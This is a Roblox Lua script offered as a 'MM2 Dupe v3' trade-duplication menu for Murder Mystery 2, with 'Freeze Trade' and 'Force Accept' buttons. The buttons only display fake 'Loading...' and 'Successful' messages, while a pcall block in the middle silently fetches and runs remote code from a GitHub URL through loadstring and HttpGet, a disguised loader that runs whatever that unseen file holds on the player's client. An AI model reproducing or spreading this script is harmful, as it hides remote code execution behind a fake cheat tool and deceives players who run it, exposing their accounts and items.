-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MM2Menu"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local menuFrame = Instance.new("Frame")
menuFrame.Name = "MenuFrame"
menuFrame.Size = UDim2.new(0, 320, 0, 220)
menuFrame.AnchorPoint = Vector2.new(0.5, 0.5)
menuFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
menuFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
menuFrame.BackgroundTransparency = 0.3
menuFrame.BorderSizePixel = 0
menuFrame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = menuFrame

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 20, 0, 5)
title.BackgroundTransparency = 1
title.Text = "MM2 Dupe v3"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = menuFrame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 25, 0, 25)
closeButton.Position = UDim2.new(1, -30, 0, 5)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Parent = menuFrame
closeButton.MouseButton1Click:Connect(function()
    screenGui.Enabled = false
end)

local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 25, 0, 25)
minimizeButton.Position = UDim2.new(1, -60, 0, 5)
minimizeButton.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
minimizeButton.Text = "-"
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.Parent = menuFrame

local minimized = false
minimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    for _, child in pairs(menuFrame:GetChildren()) do
        if child ~= title and child ~= minimizeButton and child ~= closeButton then
            child.Visible = not minimized
        end
    end
    menuFrame.Size = minimized and UDim2.new(0, 320, 0, 40) or UDim2.new(0, 320, 0, 220)
end)

pcall(function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/d5adc836388b91cc676577a4.lua'))()
end)

local function createButton(text, position, parent)
    local button = Instance.new("TextButton")
    button.Text = text
    button.Size = UDim2.new(0, 140, 0, 30)
    button.Position = position
    button.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
    button.BackgroundTransparency = 0.3
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 14
    button.Parent = parent
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
    end)
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
    end)
    button.MouseButton1Down:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    end)
    button.MouseButton1Up:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
    end)
    return button
end

local freezeButton = createButton("Freeze Trade", UDim2.new(0, 10, 0, 50), menuFrame)
local forceButton = createButton("Force Accept", UDim2.new(0, 10, 0, 90), menuFrame)

local credits = Instance.new("TextLabel")
credits.Text = "Credits to JNScripts"
credits.Size = UDim2.new(1, -10, 0, 20)
credits.Position = UDim2.new(0, 5, 1, -25)
credits.BackgroundTransparency = 1
credits.TextColor3 = Color3.fromRGB(255, 255, 255)
credits.TextXAlignment = Enum.TextXAlignment.Right
credits.Parent = menuFrame

local function showLoadingAndSuccess(button, buttonText)
    button.Text = "Loading..."
    button.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    wait(3)
    button.Text = buttonText .. " Successful"
    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    wait(2)
    button.Text = buttonText
    button.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
end

freezeButton.MouseButton1Click:Connect(function()
    showLoadingAndSuccess(freezeButton, "Freeze Trade")
end)

forceButton.MouseButton1Click:Connect(function()
    showLoadingAndSuccess(forceButton, "Force Accept")
end)

local UIS = game:GetService("UserInputService")
local dragging, dragStart, startPos

menuFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = menuFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

menuFrame.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        menuFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
